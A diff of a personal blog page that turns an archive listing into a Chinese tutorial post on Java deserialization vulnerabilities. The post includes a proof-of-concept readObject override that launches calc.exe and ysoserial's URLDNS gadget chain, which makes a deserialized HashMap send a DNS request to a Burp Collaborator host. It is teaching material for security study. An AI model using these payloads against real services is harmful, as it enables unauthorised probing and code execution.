@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018/11 | Halfblue</title>
+  <title>java反序列化连续剧一 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Halfblue">
-<meta property="og:url" content="http://yoursite.com/archives/2018/11/index.html">
+  <meta name="description" content="最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化连续剧一">
+<meta property="og:url" content="http://yoursite.com/2020/03/21/java反序列化连续剧一/index.html">
 <meta property="og:site_name" content="Halfblue">
+<meta property="og:description" content="最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。">
+<meta property="og:updated_time" content="2020-03-23T03:08:13.688Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halfblue">
+<meta name="twitter:title" content="java反序列化连续剧一">
+<meta name="twitter:description" content="最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。">
   
     <link rel="alternative" href="/atom.xml" title="Halfblue" type="application/atom+xml">
   
@@ -143,60 +147,150 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-java反序列化连续剧一" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/26/rw养生之友情检测/" class="archive-article-date">
-  	<time datetime="2018-11-26T13:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/26/rw养生之友情检测/">rw养生之友情检测</a>
+    <h1 class="article-title" itemprop="name">
+      java反序列化连续剧一
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/03/21/java反序列化连续剧一/" class="archive-article-date">
+  	<time datetime="2020-03-21T15:26:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。<a id="more"></a><br>和python、php类似，java也有序列化和反序列化的功能，自然也存在类似的安全问题。将对象序列化其实就是将对象转换为字节序列，方便保存和传输。先写一个正常的序列化和反序列化过程看看。<br>首先定义一个类，这个类需要继承Serializable才能被反序列化。这个接口其实是空的，只是相当于一个标记。然后需要定义serialVersionUID，否则可能会因为序列化的版本号不同报错。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.Serializable;</div><div class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</div><div class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.FileOutputStream;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line">    <span class="keyword">public</span> String name;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">        <span class="keyword">this</span>.age = age;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>然后定义序列化的函数，其实就是调用ObjectOutputStream的writeObject方法，将传入的对象保存到文件。文件开头是16进制aced0005<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serial</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span> (<span class="comment">//创建一个ObjectOutputStream输出流</span></div><div class="line">             ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"object.txt"</span>))) &#123;</div><div class="line">            <span class="comment">//将对象序列化到文件</span></div><div class="line"></div><div class="line">            oos.writeObject(obj);</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>反序列化的函数，其实就是调用ObjectInputStream的readObject方法，从文件中读取对象。反序列化创建对象的过程是和构造函数无关的，即使修改构造函数也不会改变生成的类的内容。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unser</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> (<span class="comment">//创建一个ObjectInputStream输入流</span></div><div class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"object.txt"</span>))) &#123;</div><div class="line">            Person p = (Person) ois.readObject();</div><div class="line">            System.out.println(p.name);</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">	<span class="comment">//主函数</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"halfblue"</span>, <span class="number">23</span>);</div><div class="line">        ser(person);</div><div class="line">        unser();</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其实和别的语言差不多，核心就是writeObject和readObject两个方法(感觉相当于php的serialize和unserialize)。而反序列化过程其实只调用了readObject这一个函数。所以利用方法也就是找重写了这个函数的类，再调用重写过的readObject方法(有点像python反序列化的reduce)。比如给上面的person类重写个弹计算器的readObject<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line">    <span class="keyword">public</span> String name;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">        <span class="keyword">this</span>.age = age;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</div><div class="line">        in.defaultReadObject();<span class="comment">//调用原始的readOject方法</span></div><div class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这样反序列化的时候会执行重写后的readObject，弹个计算器。<br>当然这只是观察重写readObject会有什么效果，真实环境不会有这样的代码。但有可能有某个类重写了readObject方法，被反序列化的时候实现了某些意料之外的效果。<br>分析个实例，p神推荐的URLDNS利用链，来自ysoserial。首先是漏洞代码vul.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">vul</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</div><div class="line">        ois.readObject();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其实这行代码就相当于php中的unserialize(file_get_contents(“out.bin”))，非常直白。<br>然后分析下生成序列化文件的代码，这里的效果是在反序列化时实现一个dns请求，类似一个盲ssrf的效果。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</div><div class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://mj9zyafbickia0sjiv3m19nvkmqde2.burpcollaborator.net"</span>);<span class="comment">//burp的collaborator</span></div><div class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);<span class="comment">//利用反射修改私有属性</span></div><div class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">//URL类的hashCode属性是private的，需要setAccessible </span></div><div class="line">        <span class="comment">//f.set(url, 123);可以设置hashCode不等于-1避免在序列化阶段发送DNS请求</span></div><div class="line">        hashMap.put(url, <span class="string">"xxx"</span>); <span class="comment">//第二个参数随意取值，不重要，但需要是可以序列化的</span></div><div class="line">        f.set(url, -<span class="number">1</span>); <span class="comment">//注意要先hashMap.put再执行这一行，因为执行put之后hashCode已经不为-1，需要重新赋值为-1才能在反序列化时再次计算hashCode，触发DNS请求</span></div><div class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</div><div class="line">        oos.writeObject(hashMap);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>分析下原理：这段代码最后传到writeObject的是一个HashMap类型的对象，所以肯定是HashMap的readObject重写了，跟进去看一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</div><div class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></div><div class="line">        s.defaultReadObject();</div><div class="line">        reinitialize();</div><div class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</div><div class="line">                                             loadFactor);</div><div class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></div><div class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></div><div class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</div><div class="line">                                             mappings);</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></div><div class="line">            <span class="comment">// Size the table using given load factor only if within</span></div><div class="line">            <span class="comment">// range of 0.25...4.0</span></div><div class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</div><div class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</div><div class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</div><div class="line">                       DEFAULT_INITIAL_CAPACITY :</div><div class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</div><div class="line">                       MAXIMUM_CAPACITY :</div><div class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</div><div class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</div><div class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</div><div class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</div><div class="line">            <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</div><div class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</div><div class="line">            table = tab;</div><div class="line"></div><div class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</div><div class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                    K key = (K) s.readObject();</div><div class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                    V value = (V) s.readObject();</div><div class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>根据ysoserial的注释，是hash操作触发了DNS，所以跟一下最后一行的hash函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> h;</div><div class="line">	<span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这个hash函数调用了key的hashCode方法，这里的key是URL类型的对象，而这个类正好有个hashCode方法,所以这里调用的就不是HashMap类的hashCode而是URL的hashCode了，长这样：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</div><div class="line">            <span class="keyword">return</span> hashCode;</div><div class="line"></div><div class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</div><div class="line">        <span class="keyword">return</span> hashCode;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>hashCode等于-1的时候调用handler.hashCode，再看看handler的hashCode是什么：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="comment">// Generate the protocol part.</span></div><div class="line">        String protocol = u.getProtocol();</div><div class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</div><div class="line">            h += protocol.hashCode();</div><div class="line"></div><div class="line">        <span class="comment">// Generate the host part.</span></div><div class="line">        InetAddress addr = getHostAddress(u);</div><div class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</div><div class="line">            h += addr.hashCode();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            String host = u.getHost();</div><div class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</div><div class="line">                h += host.toLowerCase().hashCode();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// Generate the file part.</span></div><div class="line">        String file = u.getFile();</div><div class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</div><div class="line">            h += file.hashCode();</div><div class="line"></div><div class="line">        <span class="comment">// Generate the port part.</span></div><div class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</div><div class="line">            h += getDefaultPort();</div><div class="line">        <span class="keyword">else</span></div><div class="line">            h += u.getPort();</div><div class="line"></div><div class="line">        <span class="comment">// Generate the ref part.</span></div><div class="line">        String ref = u.getRef();</div><div class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</div><div class="line">            h += ref.hashCode();</div><div class="line"></div><div class="line">        <span class="keyword">return</span> h;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>中间的InetAddress addr = getHostAddress(u)这里调用了getHostAddress方法，这个方法一看名字就是发起了DNS请求，分析到此结束。</p>
+<p>可以发现其实利用方法和php的差不多，也是利用不同类同名的方法。调用链就是HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p>
+<p>参考链接<br><a href="https://xz.aliyun.com/t/7157" target="_blank" rel="external">https://xz.aliyun.com/t/7157</a><br><a href="https://www.heibai.org/post/1529.html" target="_blank" rel="external">https://www.heibai.org/post/1529.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list">
 			 
         <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color3">渗透</a>
+        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
         </li>
       
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2020/03/21/java反序列化连续剧一/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/03/23/java反序列化连续剧二/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          java反序列化连续剧二
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/03/09/python安全之pickle反序列化/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python安全之pickle反序列化</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-    
+
 
 
           </div>
@@ -219,8 +313,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
